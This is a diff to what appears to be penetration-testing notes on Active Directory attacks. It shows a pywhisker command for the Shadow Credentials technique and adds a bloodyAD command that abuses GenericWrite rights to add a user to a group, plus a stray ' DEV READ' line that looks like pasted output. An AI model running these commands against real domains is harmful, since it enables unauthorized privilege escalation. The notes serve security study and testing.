@@ -374,7 +374,7 @@ Can be logged as targed user to system when a password is strong or some service
 ```bash
 pywhisker -d domain -u "username" -p "password" --target "target_object" --action "list"
 ```
-
+ DEV             READ       
 2.Add *KeyCredentialLink* to target user in AD , it is doing because after taking *Kerberos TGT* as a target user
 
 ```bash
@@ -409,6 +409,11 @@ Links:
  https://github.com/ShutdownRepo/pywhisker[pywhisker]
  https://www.hackingarticles.in/shadow-credentials-attack/[shadow-credentials-attack]
 
+*GenericWrite* perm over group gives opportunity to add yourself to group
+
+```bash
+bloodyAD --host 10.10.10.10 -d domain -u 'username' -p 'password' add groupMember  'target_group' 'username'
+```
 
 [[DCSync]]
 === DCSync 
